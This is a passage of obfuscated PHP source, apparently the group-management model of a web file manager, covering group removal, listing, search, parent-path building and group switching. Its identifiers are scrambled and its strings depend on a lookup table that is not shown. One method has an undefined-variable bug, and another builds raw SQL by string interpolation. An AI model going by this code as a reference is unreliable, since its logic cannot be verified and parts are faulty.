$_SERVER[•Ùç É]; $î²÷Œê = $this->getInfoSimple($ü·åúÑ); if (!$î²÷Œê) { return !1; } $this->_clearCache($ü·åúÑ); return $this->metaSet($ü·åúÑ, $è¸Û¬Š›[795], $°×¡»ì»); if ($°×¡»ì» == $è¸Û¬Š›[90]) { $šÙ·ı´ì = $this->parentLevelArray($î²÷Œê[$è¸Û¬Š›[555]]); } else { } $šÙ·ı´ì[] = $î²÷Œê[$è¸Û¬Š›[1904]]; $·Ùøù®Ğ = array(); foreach ($šÙ·ı´ì as $ü·åúÑ) { $·Ùøù®Ğ[] = array($è¸Û¬Š›[1904] => $ü·åúÑ, $è¸Û¬Š›[96] => $è¸Û¬Š›[795], $è¸Û¬Š›[420] => $°×¡»ì»); $this->_clearCache($ü·åúÑ); } return Model($è¸Û¬Š›[1993])->addAll($·Ùøù®Ğ, array(), !0); } protected function groupRemove($óÌíşå÷, $ó”‘Ö­† = false) { $¯®É¯Öö =& $_SERVER[•Ùç É]; $¡ê¾ıßº = array($¯®É¯Öö[1904] => $óÌíşå÷); $×ÌØ—½Ğ = $this->where($¡ê¾ıßº)->find(); if (!$×ÌØ—½Ğ || $×ÌØ—½Ğ[$¯®É¯Öö[182]] == 0) { return !1; } if (!$ó”‘Ö­†) { $§¤Ì›©ä = $this->getInfoSimple($×ÌØ—½Ğ[$¯®É¯Öö[182]]); $this->_changeChildLevel($×ÌØ—½Ğ, $§¤Ì›©ä, !0); $this->where(array($¯®É¯Öö[182] => $óÌíşå÷))->save(array($¯®É¯Öö[182] => $×ÌØ—½Ğ[$¯®É¯Öö[182]])); $this->_clearCache($§¤Ì›©ä[$¯®É¯Öö[1904]]); } Model($¯®É¯Öö[1993])->where($¡ê¾ıßº)->delete(); Model($¯®É¯Öö[1994])->where($¡ê¾ıßº)->delete(); Model($¯®É¯Öö[870])->groupRootRemove($óÌíşå÷); $this->_clearCache($×ÌØ—½Ğ[$¯®É¯Öö[182]]); return $this->where($¡ê¾ıßº)->delete(); } protected function groupSort($„ÄÕ¬ˆù) { $ø¸–¶Õ =& $_SERVER[•Ùç É]; $¸µàë© = array(); foreach ($„ÄÕ¬ˆù as $ëğ¦šŸ => $ÂÙÏ¯ø‰) { $¸µàë©[] = array($ø¸–¶Õ[1904], $ÂÙÏ¯ø‰, $ø¸–¶Õ[1928], $ëğ¦šŸ + 1); } $this->saveAll($¸µàë©); } public function listData() { $¢ş„‰ñ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¢ş„‰ñ[$_SERVER[•Ùç É][415]]); return $¢ş„‰ñ; } private function _makeOrder($—‹È¢õ« = '') { $á›ÄóÚÂ =& $_SERVER[•Ùç É]; $Œ¾ÃÙ©… = array($á›ÄóÚÂ[1904], $á›ÄóÚÂ[32], $á›ÄóÚÂ[1893], $á›ÄóÚÂ[217]); $ØÔ«ñ = array($á›ÄóÚÂ[493] => $á›ÄóÚÂ[494], $á›ÄóÚÂ[495] => $á›ÄóÚÂ[496]); $¿ÊŞ°Ì¤ = Input::get($á›ÄóÚÂ[500], $á›ÄóÚÂ[7], $á›ÄóÚÂ[1908], $Œ¾ÃÙ©…); $ÕªäÁ•£ = Input::get($á›ÄóÚÂ[501], $á›ÄóÚÂ[7], $á›ÄóÚÂ[1995], array($á›ÄóÚÂ[1995], $á›ÄóÚÂ[495])); $ÕªäÁ•£ = $ØÔ«ñ[$ÕªäÁ•£]; $—‹È¢õ« = $—‹È¢õ« . "{$¿ÊŞ°Ì¤}\x20{$ÕªäÁ•£}\54\x20\147\x72\157\165\160\111\x44\40\x61\x73\143"; return $this->order($—‹È¢õ«); } public function listChild($ÔÊÕÅÌÉ) { $ÍşËï–à =& $_SERVER[•Ùç É]; $Ò•ûßì = $this->where(array($ÍşËï–à[182] => $ÔÊÕÅÌÉ))->_makeOrder()->selectPage(200); $this->_listDataApply($Ò•ûßì[$ÍşËï–à[415]]); return $Ò•ûßì; } public function listChildIds($¨¨¤™Ê–) { $¾¯Ï•ª” =& $_SERVER[•Ùç É]; if (is_string($ğ‰Â°ü)) { $¨¨¤™Ê– = explode($¾¯Ï•ª”[50], $¨¨¤™Ê–); } $îëé»Šı = $this->where(array($¾¯Ï•ª”[1904] => array($¾¯Ï•ª”[7], $¨¨¤™Ê–)))->field($¾¯Ï•ª”[1996])->select(); if (!$îëé»Šı) { return !1; } $ëØµ³ôı = array(); foreach ($îëé»Šı as $˜’ş‹Ó) { $ëØµ³ôı[] = "\x73\x65\154\145\143\x74\x20\147\x72\x6f\x75\160\x49\x44\x20\146\162\157\x6d\40\140\x67\x72\157\165\160\140\40\167\150\x65\162\145\40\160\141\x72\x65\156\x74\x4c\x65\166\x65\x6c\x20\x6c\x69\153\x65\40\47{$˜’ş‹Ó[$¾¯Ï•ª”[555]]}{$˜’ş‹Ó[$¾¯Ï•ª”[1904]]}\x2c\45\47"; } $ëØµ³ôı = implode($¾¯Ï•ª”[1997], $ëØµ³ôı); $îëé»Šı = $this->query($ëØµ³ôı); if (!$îëé»Šı) { return array(); } $¨¨¤™Ê– = array_to_keyvalue($îëé»Šı, $¾¯Ï•ª”[12], $¾¯Ï•ª”[1904]); return array_unique($¨¨¤™Ê–); } public function listByID($€¢Óã¾Ù) { $Ê„Çş¶§ =& $_SERVER[•Ùç É]; if (!$€¢Óã¾Ù) { return array(); } $îşá“èœ = array($Ê„Çş¶§[1904] => array($Ê„Çş¶§[7], $€¢Óã¾Ù)); $î‰¡Ùİ = $this->where($îşá“èœ)->select(); $î‰¡Ùİ = array_sort_keep($î‰¡Ùİ, $Ê„Çş¶§[1904], $€¢Óã¾Ù); $this->_listDataApply($î‰¡Ùİ); return $î‰¡Ùİ; } public function listSearch($ÛÌş£¹ã) { $ÊƒĞõ¥ =& $_SERVER[•Ùç É]; $¦Îü€  = $ÛÌş£¹ã[$ÊƒĞõ¥[1998]]; $•Ôâ‰©æ = isset($ÛÌş£¹ã[$ÊƒĞõ¥[1999]]) ? $ÛÌş£¹ã[$ÊƒĞõ¥[1999]] : !1; if (!trim($¦Îü€ )) { return !1; } $¦Îü€  = str_replace($ÊƒĞõ¥[2000], $ÊƒĞõ¥[2001], $¦Îü€ ); $ÑÂ×™ Â = array($ÊƒĞõ¥[1904] => array($ÊƒĞõ¥[429], "{$¦Îü€ }\x25"), $ÊƒĞõ¥[32] => array($ÊƒĞõ¥[429], "\45{$¦Îü€ }\45"), $ÊƒĞõ¥[1051] => $ÊƒĞõ¥[2002]); if ($•Ôâ‰©æ) { $üÆ’¯§ = $this->getInfoSimple($•Ôâ‰©æ); $›¼ÍäÊ† = $üÆ’¯§[$ÊƒĞõ¥[555]] . $•Ôâ‰©æ . $ÊƒĞõ¥[583]; $ÑÂ×™ Â = array($ÑÂ×™ Â, array($ÊƒĞõ¥[555] => array($ÊƒĞõ¥[429], $›¼ÍäÊ†))); } $ÑÂ×™ Â = $this->parseWhereLike($ÑÂ×™ Â); $§”˜Òì = $this->_makeOrder()->where($ÑÂ×™ Â)->selectPage(20); $§”˜Òì = $§”˜Òì ? $§”˜Òì : array($ÊƒĞõ¥[415] => array(), $ÊƒĞõ¥[412] => array()); if (!$§”˜Òì || count($§”˜Òì[$ÊƒĞõ¥[415]]) < 5 && Input::check($¦Îü€ , $ÊƒĞõ¥[364])) { $Â‡¦¸œ• = $this->groupChildrenAll($•Ôâ‰©æ); $‚Å«ûÚÌ = $this->_searchFromMeta($ÊƒĞõ¥[507], $¦Îü€ , 10, $Â‡¦¸œ•); $¡¸èáŠÙ = $this->_searchFromMeta($ÊƒĞõ¥[508], $¦Îü€ , 10, $Â‡¦¸œ•); $Ôõƒ¬ÕÏ = array_merge($‚Å«ûÚÌ, $¡¸èáŠÙ, $§”˜Òì[$ÊƒĞõ¥[415]]); $§”˜Òì[$ÊƒĞõ¥[415]] = array_unique_by_key($Ôõƒ¬ÕÏ, $ÊƒĞõ¥[1904]); $§”˜Òì[$ÊƒĞõ¥[412]][$ÊƒĞõ¥[413]] = count($§”˜Òì[$ÊƒĞõ¥[415]]); $§”˜Òì[$ÊƒĞõ¥[412]][$ÊƒĞõ¥[414]] = ceil($§”˜Òì[$ÊƒĞõ¥[412]][$ÊƒĞõ¥[413]] / $§”˜Òì[$ÊƒĞõ¥[412]][$ÊƒĞõ¥[409]]); } $this->_listDataApply($§”˜Òì[$ÊƒĞõ¥[415]]); return $§”˜Òì; } protected function groupChildrenAll($ÚË™²è†) { $ŒÓÖ•Ü =& $_SERVER[•Ùç É]; if (!$ÚË™²è†) { return !1; } if (!is_array($ÚË™²è†)) { $ÚË™²è† = array($ÚË™²è†); } $Ëª¤µª– = $ÚË™²è†; foreach ($ÚË™²è† as $›Ü³îË) { $èığù Ò = $this->getInfoSimple($›Ü³îË); $—·×ê«× = array($ŒÓÖ•Ü[555] => array($ŒÓÖ•Ü[429], $èığù Ò[$ŒÓÖ•Ü[555]] . $›Ü³îË . $ŒÓÖ•Ü[583])); $úĞ¡§ÉÊ = $this->field($ŒÓÖ•Ü[1904])->where($—·×ê«×)->select(); $Ëª¤µª– = array_merge($Ëª¤µª–, array_to_keyvalue($úĞ¡§ÉÊ, $ŒÓÖ•Ü[12], $ŒÓÖ•Ü[1904])); } return array_unique($Ëª¤µª–); } private function _searchFromMeta($ë…¯øôû, $³ºÇ÷ˆ§, $ŞÉæô‘, $â´‘âç) { $äºä šÛ =& $_SERVER[•Ùç É]; $³ºÇ÷ˆ§ = strtolower($³ºÇ÷ˆ§); $õüÅ¾¬ˆ = array($äºä šÛ[96] => $ë…¯øôû, $äºä šÛ[420] => array($äºä šÛ[429], "\x25{$³ºÇ÷ˆ§}\x25")); $õüÅ¾¬ˆ = $this->parseWhereLike($õüÅ¾¬ˆ); if ($â´‘âç) { $õüÅ¾¬ˆ[$äºä šÛ[1904]] = array($äºä šÛ[7], $â´‘âç); } $—®‰µ“è = Model($äºä šÛ[2003])->where($õüÅ¾¬ˆ)->limit($ŞÉæô‘)->select(); if (!$—®‰µ“è) { return array(); } $—®‰µ“è = array_to_keyvalue($—®‰µ“è, $äºä šÛ[12], $äºä šÛ[1904]); $äûÅ¤çÂ = $this->where(array($äºä šÛ[1992] => array($äºä šÛ[7], $—®‰µ“è)))->select(); if (!$äûÅ¤çÂ) { return array(); } return $äûÅ¤çÂ; } protected function _listDataApplyItem($ò’Ğ‡¤Ø) { $Ú¿²†íÍ = array($ò’Ğ‡¤Ø); $this->_listDataApply($Ú¿²†íÍ); return $Ú¿²†íÍ[0]; } protected function _listDataApply(&$™¦Øùüş) { $ÜˆâøÃ =& $_SERVER[•Ùç É]; if (!$™¦Øùüş) { return; } $ì”£¾„™ = array_to_keyvalue($™¦Øùüş, $ÜˆâøÃ[12], $ÜˆâøÃ[1904]); $this->_listAppendChildren($™¦Øùüş); $this->_listAppendChildrenMember($™¦Øùüş); $this->_listAppendMeta($™¦Øùüş, $ì”£¾„™); $this->_listAppendParent($™¦Øùüş); $this->_listAppendSourceRoot($™¦Øùüş, $ì”£¾„™); } private function _listAppendChildren(&$öûé„ÆÕ) { $¥Â±¹Éù =& $_SERVER[•Ùç É]; $²ÇÅÈ°Ö = array_to_keyvalue($öûé„ÆÕ, $¥Â±¹Éù[12], $¥Â±¹Éù[1904]); $·¦½ç‚à = array($¥Â±¹Éù[182] => array($¥Â±¹Éù[7], $²ÇÅÈ°Ö)); $ÃŞŸ‰° = array($¥Â±¹Éù[182], $¥Â±¹Éù[2004] => $¥Â±¹Éù[536]); $–ºÕ€” = $this->field($ÃŞŸ‰°)->where($·¦½ç‚à)->group($¥Â±¹Éù[182])->select(); $È¶‚Ï‹á = array_to_keyvalue($–ºÕ€”, $¥Â±¹Éù[182], $¥Â±¹Éù[536]); foreach ($öûé„ÆÕ as &$ôùÑßÔ) { $† ¿ƒì÷ = $ôùÑßÔ[$¥Â±¹Éù[1904]]; $ôùÑßÔ[$¥Â±¹Éù[2005]] = isset($È¶‚Ï‹á[$† ¿ƒì÷]) ? intval($È¶‚Ï‹á[$† ¿ƒì÷]) : !1; } unset($ôùÑßÔ); } private function _listAppendChildrenMember(&$ÜÓö¯ë¸) { $Äü’²Òº =& $_SERVER[•Ùç É]; $ê¯ú‰Ô• = array_to_keyvalue($ÜÓö¯ë¸, $Äü’²Òº[12], $Äü’²Òº[1904]); $ØÕëì´ = array($Äü’²Òº[1904] => array($Äü’²Òº[7], $ê¯ú‰Ô•)); $«·ÖÂ°ä = array($Äü’²Òº[1904], $Äü’²Òº[2004] => $Äü’²Òº[536]); $Ş‡¶ŠÕ° = Model($Äü’²Òº[1994])->field($«·ÖÂ°ä)->where($ØÕëì´)->group($Äü’²Òº[1904])->select(); $Êòİ´œÏ = array_to_keyvalue($Ş‡¶ŠÕ°, $Äü’²Òº[1904], $Äü’²Òº[536]); foreach ($ÜÓö¯ë¸ as &$®éÂİñˆ) { $°¤¶•¥ = $®éÂİñˆ[$Äü’²Òº[1904]]; $®éÂİñˆ[$Äü’²Òº[2006]] = isset($Êòİ´œÏ[$°¤¶•¥]) ? intval($Êòİ´œÏ[$°¤¶•¥]) : !1; } unset($®éÂİñˆ); } private function _listAppendMeta(&$‰µğÕ¸ˆ, $ô¸êÑ™œ) { $¡áá“õå =& $_SERVER[•Ùç É]; $µÚ¿èÃ† = array($¡áá“õå[1904] => array($¡áá“õå[7], $ô¸êÑ™œ)); $¾ÈùÑ = Model($¡áá“õå[1993])->where($µÚ¿èÃ†)->select(); $¾ÈùÑ = array_to_keyvalue_group($¾ÈùÑ, $¡áá“õå[1904]); foreach ($¾ÈùÑ as &$öµáÚªÆ) { $öµáÚªÆ = array_to_keyvalue($öµáÚªÆ, $¡áá“õå[96], $¡áá“õå[420]); } unset($öµáÚªÆ); foreach ($‰µğÕ¸ˆ as &$Ş–µŸŠ) { $Ş–µŸŠ[$¡áá“õå[509]] = array(); if (isset($¾ÈùÑ[$Ş–µŸŠ[$¡áá“õå[1904]]])) { $Ş–µŸŠ[$¡áá“õå[509]] = $¾ÈùÑ[$Ş–µŸŠ[$¡áá“õå[1904]]]; } } unset($Ş–µŸŠ); } protected function parentLevelArray($ıº”ÌŞÑ) { $ğïœŞë³ =& $_SERVER[•Ùç É]; $ıº”ÌŞÑ = explode($ğïœŞë³[50], trim($ıº”ÌŞÑ, $ğïœŞë³[50])); $ıº”ÌŞÑ = array_remove_value($ıº”ÌŞÑ, $ğïœŞë³[214]); return $ıº”ÌŞÑ; } protected function parentInGroup($ÑÚ­–‚ß, $’Ò†‡Ë) { $— ‚şà€ =& $_SERVER[•Ùç É]; $…İñœ®É = $this->getInfoSimple($ÑÚ­–‚ß); if (!$…İñœ®É) { return !0; } $ôúûÈŸÁ = $this->parentLevelArray($…İñœ®É[$— ‚şà€[555]]); $ôúûÈŸÁ[] = $ÑÚ­–‚ß; foreach ($ôúûÈŸÁ as $ÑÚ­–‚ß) { if (in_array($ÑÚ­–‚ß . $— ‚şà€[12], $’Ò†‡Ë)) { return !0; } } return !1; } private function _listAppendParent(&$±µËşåÊ) { $×’¯»ÜÌ =& $_SERVER[•Ùç É]; $÷ó‚ŠÊ„ = array(); foreach ($±µËşåÊ as &$…Ù˜İé») { $÷ó‚ŠÊ„[$…Ù˜İé»[$×’¯»ÜÌ[1904]]] = $…Ù˜İé»[$×’¯»ÜÌ[32]]; $æË‡®€é = $this->parentLevelArray($…Ù˜İé»[$×’¯»ÜÌ[555]]); foreach ($æË‡®€é as $Üì¼’Ç‚) { if (!isset($÷ó‚ŠÊ„[$Üì¼’Ç‚])) { $÷ó‚ŠÊ„[$Üì¼’Ç‚] = 0; } } } unset($…Ù˜İé»); foreach ($÷ó‚ŠÊ„ as $úŒ¥ ¨ => $Îœ™ËÊ) { if ($Îœ™ËÊ) { continue; } $„ã ÕŸÎ = $this->getInfoSimple($úŒ¥ ¨); $÷ó‚ŠÊ„[$úŒ¥ ¨] = $„ã ÕŸÎ[$×’¯»ÜÌ[32]]; } $‘•€ç¡ = $GLOBALS[$×’¯»ÜÌ[6]][$×’¯»ÜÌ[91]][$×’¯»ÜÌ[2007]]; if (KodUser::isRoot()) { $‘•€ç¡ = !1; } foreach ($±µËşåÊ as &$…Ù˜İé») { $æË‡®€é = $this->parentLevelArray($…Ù˜İé»[$×’¯»ÜÌ[555]]); $œœÇÚùÜ = $×’¯»ÜÌ[12]; foreach ($æË‡®€é as $úŒ¥ ¨ => $Üì¼’Ç‚) { if ($‘•€ç¡ && $úŒ¥ ¨ == 0) { continue; } $œœÇÚùÜ .= $÷ó‚ŠÊ„[$Üì¼’Ç‚] . $×’¯»ÜÌ[8]; } if ($æË‡®€é) { $œœÇÚùÜ .= $…Ù˜İé»[$×’¯»ÜÌ[32]]; } $…Ù˜İé»[$×’¯»ÜÌ[560]] = str_replace($×’¯»ÜÌ[563], $×’¯»ÜÌ[8], $œœÇÚùÜ); } unset($…Ù˜İé»); } private function _listAppendSourceRoot(&$Ğğİ©é‰, $êæ¸›³š) { $Øé™‘Âó =& $_SERVER[•Ùç É]; $‰İ¨¯§æ = Model($Øé™‘Âó[870])->listSourceRoot(SourceModel::TYPE_GROUP, $êæ¸›³š); $‰İ¨¯§æ = array_to_keyvalue($‰İ¨¯§æ, $Øé™‘Âó[540]); $‰İ¨¯§æ = array_remove_key($‰İ¨¯§æ, $Øé™‘Âó[540]); foreach ($Ğğİ©é‰ as &$«â¶«¦) { $«â¶«¦[$Øé™‘Âó[89]] = $‰İ¨¯§æ[$«â¶«¦[$Øé™‘Âó[1904]]] ? $‰İ¨¯§æ[$«â¶«¦[$Øé™‘Âó[1904]]] : array(); } unset($«â¶«¦); } protected function groupMerge($¥Ï®­íá) { $¥Ï®­íá = array_values(array_unique($¥Ï®­íá)); $ƒğâŸ£Ÿ = array(); for ($¤£»‰Ş = 0; $¤£»‰Ş < count($¥Ï®­íá); $¤£»‰Ş++) { $òú«ª‘â = !1; for ($”Óì¼òÓ = 0; $”Óì¼òÓ < count($¥Ï®­íá); $”Óì¼òÓ++) { if ($¤£»‰Ş == $”Óì¼òÓ) { continue; } if ($this->isParentOf($¥Ï®­íá[$”Óì¼òÓ], $¥Ï®­íá[$¤£»‰Ş])) { $òú«ª‘â = !0; break; } } if (!$òú«ª‘â) { $ƒğâŸ£Ÿ[] = $¥Ï®­íá[$¤£»‰Ş]; } } return $ƒğâŸ£Ÿ; } protected function isParentOf($Š´Ø„¬é, $³ğ‡¡Œâ) { $˜ë’¹ı =& $_SERVER[•Ùç É]; if (!$Š´Ø„¬é || !$³ğ‡¡Œâ || $Š´Ø„¬é == $³ğ‡¡Œâ) { return !1; } $ı˜èú¡ = $this->getInfoSimple($Š´Ø„¬é); $ıãÜ•¢ = $this->getInfoSimple($³ğ‡¡Œâ); $ÖÃ”œÂ‹ = $ı˜èú¡[$˜ë’¹ı[555]] . $Š´Ø„¬é . $˜ë’¹ı[50]; if (substr($ıãÜ•¢[$˜ë’¹ı[555]], 0, strlen($ÖÃ”œÂ‹)) == $ÖÃ”œÂ‹) { return !0; } return !1; } public function groupShowRoot($ÁŠ­Æ¨÷, $„¬­¡Óê = false) { $‚¼èÃß =& $_SERVER[•Ùç É]; $€¶ç¹†Û = $this->getInfo($ÁŠ­Æ¨÷); if (!$€¶ç¹†Û) { return array(); } $¹±¼Ò– = $this->parentLevelArray($€¶ç¹†Û[$‚¼èÃß[555]]); $Ï‰™«æ” = array($ÁŠ­Æ¨÷); if (count($¹±¼Ò–) == 0) { return $Ï‰™«æ”; } if ($„¬­¡Óê && count($¹±¼Ò–) == 1) { return $Ï‰™«æ”; } if (!$€¶ç¹†Û[$‚¼èÃß[509]] || !isset($€¶ç¹†Û[$‚¼èÃß[509]][$‚¼èÃß[1990]]) || $€¶ç¹†Û[$‚¼èÃß[509]][$‚¼èÃß[1990]] == $‚¼èÃß[1959]) { return $this->groupShowRoot($¹±¼Ò–[count($¹±¼Ò–) - 1], $„¬­¡Óê); } if ($€¶ç¹†Û[$‚¼èÃß[509]][$‚¼èÃß[1990]] == $‚¼èÃß[403]) { $»Î¾Îî· = explode($‚¼èÃß[50], $€¶ç¹†Û[$‚¼èÃß[509]][$‚¼èÃß[1991]]); if ($»Î¾Îî·) { $Ï‰™«æ” = array_merge($Ï‰™«æ”, $»Î¾Îî·); } } return $Ï‰™«æ”; } protected function resetParentLevel() { $‘ßº¦»µ =& $_SERVER[•Ùç É]; $ü‡»¨‡Ô = $‘ßº¦»µ[1904]; $óªñ¢Ÿı = $this->select(); $óªñ¢Ÿı = array_to_keyvalue($óªñ¢Ÿı, $ü‡»¨‡Ô); foreach ($óªñ¢Ÿı as $±òûæ•ã) { $˜–™¦ÎÄ = $±òûæ•ã; $ÌÜø«—Õ = array(); while ($˜–™¦ÎÄ[$‘ßº¦»µ[182]] != 0) { $ÌÜø«—Õ[] = $˜–™¦ÎÄ[$‘ßº¦»µ[182]]; $˜–™¦ÎÄ = $óªñ¢Ÿı[$˜–™¦ÎÄ[$‘ßº¦»µ[182]]]; } $ÌÜø«—Õ[] = 0; $ÌÜø«—Õ = $‘ßº¦»µ[50] . implode($‘ßº¦»µ[50], array_reverse($ÌÜø«—Õ)) . $‘ßº¦»µ[50]; $this->setNamePinyin($±òûæ•ã[$ü‡»¨‡Ô], $±òûæ•ã[$‘ßº¦»µ[32]]); $this->where(array($ü‡»¨‡Ô => $±òûæ•ã[$ü‡»¨‡Ô]))->save(array($‘ßº¦»µ[622] => $ÌÜø«—Õ)); } return $óªñ¢Ÿı; } public function groupNameAuto($ª€Ÿàâ‚, $ê¿İ¾´) { $µ£ĞËó‡ =& $_SERVER[•Ùç É]; $à³³ƒŞÍ = $this->where(array($µ£ĞËó‡[447] => $ª€Ÿàâ‚))->getField($µ£ĞËó‡[32], !0); if (!$à³³ƒŞÍ || !in_array($ê¿İ¾´, $à³³ƒŞÍ)) { return $ê¿İ¾´; } for ($Œİîøà’ = 1; $Œİîøà’ <= count($à³³ƒŞÍ) + 1; $Œİîøà’++) { $¯ÕË·ğ§ = $ê¿İ¾´ . "\x28{$Œİîøà’}\x29"; if (!in_array($¯ÕË·ğ§, $à³³ƒŞÍ)) { return $¯ÕË·ğ§; } } } public function groupSwitch($­Òˆ—ÖÆ, $ÑªÇ£îÆ) { $ÎÜ¸¹ïÎ =& $_SERVER[•Ùç É]; $Ÿ¢ıóØ = array($ÎÜ¸¹ïÎ[1904] => array($ÎÜ¸¹ïÎ[7], array($­Òˆ—ÖÆ, $ÑªÇ£îÆ))); $İ¨“àŸ“ = $this->where($Ÿ¢ıóØ)->select(); $İ¨“àŸ“ = array_to_keyvalue($İ¨“àŸ“, $ÎÜ¸¹ïÎ[1904]); if (!isset($İ¨“àŸ“[$­Òˆ—ÖÆ]) || !isset($İ¨“àŸ“[$ÑªÇ£îÆ]) || $İ¨“àŸ“[$­Òˆ—ÖÆ][$ÎÜ¸¹ïÎ[182]] == 0) { return !1; } $Ÿ¢ıóØ = array($ÎÜ¸¹ïÎ[1904] => $­Òˆ—ÖÆ); $Ò¶ÅÉ£Õ = Model($ÎÜ¸¹ïÎ[1994])->where($Ÿ¢ıóØ)->select(); if (!$Ò¶ÅÉ£Õ) { $Ò¶ÅÉ£Õ = array(); } foreach ($Ò¶ÅÉ£Õ as $ÍƒÖîş) { $³““Îö = $ÍƒÖîş[$ÎÜ¸¹ïÎ[1705]]; $Ÿ¢ıóØ = array($ÎÜ¸¹ïÎ[1705] => $³““Îö, $ÎÜ¸¹ïÎ[1904] => $ÑªÇ£îÆ); $Çï²íƒ = Model($ÎÜ¸¹ïÎ[1994])->where($Ÿ¢ıóØ)->find(); if (!$Çï²íƒ) { $…à’÷ş¥ = array($ÑªÇ£îÆ => $ÍƒÖîş[$ÎÜ¸¹ïÎ[2008]]); Model($ÎÜ¸¹ïÎ[569])->userGroupAdd($³““Îö, $…à’÷ş¥); } Model($ÎÜ¸¹ïÎ[569])->userGroupRemove($³““Îö, $­Òˆ—ÖÆ); } $Ÿ¢ıóØ = array($ÎÜ¸¹ïÎ[180] => 2, $ÎÜ¸¹ïÎ[182] => 0, $ÎÜ¸¹ïÎ[455] => 1, $ÎÜ¸¹ïÎ[540] => array($ÎÜ¸¹ïÎ[7], array($­Òˆ—ÖÆ, $ÑªÇ£îÆ))); $Î©’¦û£ = Model($ÎÜ¸¹ïÎ[870])->where($Ÿ¢ıóØ)->field($ÎÜ¸¹ïÎ[2009])->select(); $Î©’¦û£ = array_to_keyvalue($Î©’¦û£, $ÎÜ¸¹ïÎ[540], $ÎÜ¸¹ïÎ[183]); $–…­¥œ± = !empty($Î©’¦û£[$­Òˆ—ÖÆ]) ? $Î©’¦û£[$­Òˆ—ÖÆ] : !1; if ($–…­¥œ±) { if (!$Î©’¦û£[$ÑªÇ£îÆ]) { $Î©’¦û£[$ÑªÇ£îÆ] = Model($ÎÜ¸¹ïÎ[870])->groupRootAdd($ÑªÇ£îÆ); } $¸µñ¼Î = $Î©’¦û£[$ÑªÇ£îÆ]; $Ÿ¢ıóØ = array($ÎÜ¸¹ïÎ[182] => $–…­¥œ±); $Î©’¦û£ = Model($ÎÜ¸¹ïÎ[870])->where($Ÿ¢ıóØ)->field($ÎÜ¸¹ïÎ[2010])->select(); if (!$Î©’¦û£) { $Î©’¦û£ = array(); } Model($ÎÜ¸¹ïÎ[870])->moveClearAuth = !1; foreach ($Î©’¦û£ as $­ı“®Ñò) { $ŒÏ©ˆ = $­ı“®Ñò[$ÎÜ¸¹ïÎ[455]] == $ÎÜ¸¹ïÎ[90] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÎÜ¸¹ïÎ[870])->move($­ı“®Ñò[$ÎÜ¸¹ïÎ[183]], $¸µñ¼Î, $ŒÏ©ˆ); } Model($ÎÜ¸¹ïÎ[870])->moveClearAuth = !0; $Ÿ¢ıóØ = array($ÎÜ¸¹ïÎ[180] => 2, $ÎÜ¸¹ïÎ[540] => $­Òˆ—ÖÆ); $îÊ¼Ô½ = array($ÎÜ¸¹ïÎ[540] => $ÑªÇ£îÆ); Model($ÎÜ¸¹ïÎ[2011])->where($Ÿ¢ıóØ)->save($îÊ¼Ô½); Model($ÎÜ¸¹ïÎ[2012])->where($Ÿ¢ıóØ)->save($îÊ¼Ô½); } $this->_changeChildLevel($İ¨“àŸ“[$­Òˆ—ÖÆ], $İ¨“àŸ“[$ÑªÇ£îÆ], !0); $this->where(array($ÎÜ¸¹ïÎ[182] => $­Òˆ—ÖÆ))->save(array($ÎÜ¸¹ïÎ[182] => $ÑªÇ£îÆ)); $this->_clearChildrenCache($İ¨“àŸ“[$ÑªÇ£îÆ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\x61\166"; protected function cacheFunctionAlias($ÒŸäêğ) { $¿°üš±Ï =& $_SERVER[•Ùç É]; return array($¿°üš±Ï[2013] => array($ÒŸäêğ[0], $¿°üš±Ï[2014]), $¿°üš±Ï[2015] => array($ÒŸäêğ[0], $¿°üš±Ï[2016])); } protected function get($äóàÆ™ó) { $‚³ÊÚ§ =& $_SERVER[•Ùç É]; $«âÑ­ó = Model($‚³ÊÚ§[556])->metaGet($äóàÆ™ó, $‚³ÊÚ§[2017]); $¥ßÉà§ƒ = json_decode($«âÑ­ó, !0); return $¥ßÉà§ƒ ? $¥ßÉà§ƒ : array($‚³ÊÚ§[2018] => $‚³ÊÚ§[90], $‚³ÊÚ§[415] => array()); } protected function set($Åùâ½·, $ßÒ´ª•) { $Š•‡æİ“ =& $_SERVER[•Ùç É]; $ßÒ´ª• = $ßÒ´ª• ? $ßÒ´ª• : array($Š•‡æİ“[2018] => $Š•‡æİ“[90], $Š•‡æİ“[415] => array()); return Model($Š•‡æİ“[556])->metaSet($Åùâ½·, $Š•‡æİ“[2017], json_encode($ßÒ´ª•)); } protected function getByTagID($¹ƒ§°¢ê, $ıˆÇ˜úò) { $ß¸ Î™î =& $_SERVER[•Ùç É]; if (!$¹ƒ§°¢ê || !$ıˆÇ˜úò) { return !1; } if (!Model($ß¸ Î™î[556])->getInfoSimple($¹ƒ§°¢ê)) { return !1; } $ˆØòäøÇ = $this->get($¹ƒ§°¢ê); if (!$ˆØòäøÇ || !isset($ˆØòäøÇ[$ß¸ Î™î[415]])) { return !1; } $ ‘¶İ¿¹ = array_find_by_field($ˆØòäøÇ[$ß¸ Î™î[415]], $ß¸ Î™î[445], $ıˆÇ˜úò); return is_array($ ‘¶İ¿¹) ? $ ‘¶İ¿¹ : !1; } public function listSource($Ëë¿ğ–õ, $ğëßšç°) { $ìÑ³µ =& $_SERVER[•Ùç É]; if ($ğëßšç° && !is_array($ğëßšç°)) { $ğëßšç° = array($ğëßšç°); } $ì‘ö§¦ø = $this->listData($Ëë¿ğ–õ); $ÄŞ¼·õõ = array(); foreach ($ì‘ö§¦ø as $³éßı“¬) { $¼©èØÌç = $³éßı“¬[$ìÑ³µ[86]]; if (!$¼©èØÌç) { continue; } if (!isset($ÄŞ¼·õõ[$¼©èØÌç])) { $ÄŞ¼·õõ[$¼©èØÌç] = array(); } $ÄŞ¼·õõ[$¼©èØÌç][] = $³éßı“¬[$ìÑ³µ[470]]; } $ÜŠ¸õ×¨ = array(); foreach ($ÄŞ¼·õõ as $®”ô„÷ => $äÜ­áè) { $˜ÚŒÀŸ = !0; if (!$ğëßšç°) { $ÜŠ¸õ×¨[] = $®”ô„÷; continue; } foreach ($ğëßšç° as $ü Œ±Æâ) { if (!in_array($ü Œ±Æâ, $äÜ­áè)) { $˜ÚŒÀŸ = !1; break; } } if ($˜ÚŒÀŸ) { $ÜŠ¸õ×¨[] = $®”ô„÷; } } if (!$ÜŠ¸õ×¨) { return array(); } $ˆß«ÓÒ = array($ìÑ³µ[461] => array($ìÑ³µ[462], $ÜŠ¸õ×¨), 